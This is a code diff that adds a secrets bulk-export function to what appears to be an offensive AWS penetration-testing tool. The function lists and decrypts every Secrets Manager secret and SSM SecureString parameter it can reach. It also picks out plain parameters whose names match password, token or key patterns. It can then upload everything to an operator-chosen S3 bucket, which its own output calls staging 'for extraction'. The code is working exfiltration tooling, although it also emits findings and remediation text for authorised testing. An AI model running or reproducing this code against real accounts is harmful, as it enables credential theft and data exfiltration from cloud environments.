@@ -1066,3 +1066,111 @@ export async function athenaQuery(args: string[], timeout: number): Promise<Hook
 
   return { output: output.join("\n"), findings }
 }
+
+export async function secretsBulkExport(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const destBucket = argVal(args, "--dest-bucket")
+  const format = argVal(args, "--format") || "json"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Secrets Bulk Export (Secrets Manager + SSM Parameter Store)\n"]
+
+  const secrets: Record<string, string> = {}
+
+  const smList = await aws(["secretsmanager", "list-secrets", "--query", "SecretList[].[Name,ARN,Description,LastChangedDate]"], profile, region, timeout)
+  if (smList.exitCode === 0) {
+    const sl = tryJson(smList.stdout) || []
+    output.push(`[+] Secrets Manager secrets: ${sl.length}`)
+
+    for (const s of sl) {
+      const val = await aws(["secretsmanager", "get-secret-value", "--secret-id", s[1], "--query", "{value:SecretString,binary:SecretBinary}"], profile, region, timeout)
+      if (val.exitCode === 0) {
+        const v = tryJson(val.stdout)
+        const secretVal = v?.value || (v?.binary ? `[binary:${v.binary.length}bytes]` : "[empty]")
+        secrets[`sm://${s[0]}`] = secretVal
+        output.push(`  [+] ${s[0]}: ${String(secretVal).slice(0, 60)}...`)
+      } else {
+        output.push(`  [-] ${s[0]}: access denied`)
+      }
+    }
+  }
+
+  const ssmParams = await aws(["ssm", "describe-parameters", "--query", "Parameters[].[Name,Type,LastModifiedDate,Description]"], profile, region, timeout)
+  if (ssmParams.exitCode === 0) {
+    const pl = tryJson(ssmParams.stdout) || []
+    const secureParams = pl.filter((p: string[]) => p[1] === "SecureString")
+    const plainParams = pl.filter((p: string[]) => p[1] !== "SecureString")
+
+    output.push(`\n[+] SSM Parameters: ${pl.length} (${secureParams.length} SecureString, ${plainParams.length} other)`)
+
+    for (const p of secureParams) {
+      const val = await aws(["ssm", "get-parameter", "--name", p[0], "--with-decryption", "--query", "Parameter.Value"], profile, region, timeout)
+      if (val.exitCode === 0) {
+        const v = tryJson(val.stdout) || val.stdout.trim()
+        secrets[`ssm://${p[0]}`] = v
+        output.push(`  [+] ${p[0]} (SecureString): ${String(v).slice(0, 60)}...`)
+      } else {
+        output.push(`  [-] ${p[0]}: decryption denied (missing KMS access)`)
+      }
+    }
+
+    const secretPattern = /(?:password|secret|key|token|api.?key|credential|private|auth|db.?pass|connection)/i
+    const interestingPlain = plainParams.filter((p: string[]) => secretPattern.test(p[0]))
+    for (const p of interestingPlain) {
+      const val = await aws(["ssm", "get-parameter", "--name", p[0], "--query", "Parameter.Value"], profile, region, timeout)
+      if (val.exitCode === 0) {
+        const v = tryJson(val.stdout) || val.stdout.trim()
+        secrets[`ssm://${p[0]}`] = v
+        output.push(`  [+] ${p[0]} (${p[1]}): ${String(v).slice(0, 60)}...`)
+      }
+    }
+  }
+
+  const count = Object.keys(secrets).length
+  output.push(`\n[+] Total secrets extracted: ${count}`)
+
+  if (count === 0) return { output: output.join("\n"), findings }
+
+  findings.push({
+    checkId: "AWS-EXFIL-011",
+    provider: "aws",
+    severity: "critical",
+    status: "EXTRACTED",
+    resource: "secrets:bulk",
+    title: `${count} secrets bulk extracted`,
+    details: `${Object.keys(secrets).slice(0, 10).join(", ")}${count > 10 ? ` and ${count - 10} more` : ""}`,
+    remediation: "Rotate all extracted secrets immediately, restrict IAM permissions for secret access",
+  })
+
+  if (destBucket) {
+    const exportData = format === "json"
+      ? JSON.stringify(secrets, null, 2)
+      : Object.entries(secrets).map(([k, v]) => `${k}=${v}`).join("\n")
+
+    const tmpFile = `/tmp/cs-secrets-export.${format === "json" ? "json" : "env"}`
+    await Bun.write(tmpFile, exportData)
+
+    const key = `secrets-export-${Date.now().toString(36)}.${format === "json" ? "json" : "env"}`
+    const upload = await aws(["s3", "cp", tmpFile, `s3://${destBucket}/${key}`], profile, region, timeout)
+    if (upload.exitCode === 0) {
+      output.push(`[+] Exported to s3://${destBucket}/${key}`)
+      findings.push({
+        checkId: "AWS-EXFIL-012",
+        provider: "aws",
+        severity: "critical",
+        status: "STAGED",
+        resource: `s3:${destBucket}:${key}`,
+        title: `Secrets staged to S3: ${destBucket}/${key}`,
+        details: `${count} secrets exported as ${format}`,
+        remediation: `Delete: aws s3 rm s3://${destBucket}/${key}`,
+      })
+    }
+
+    await Bun.write(tmpFile, "")
+  } else {
+    output.push(`\n[*] Use --dest-bucket BUCKET to stage secrets to S3 for extraction`)
+    output.push(`[*] Use --format env for KEY=VALUE format (default: json)`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
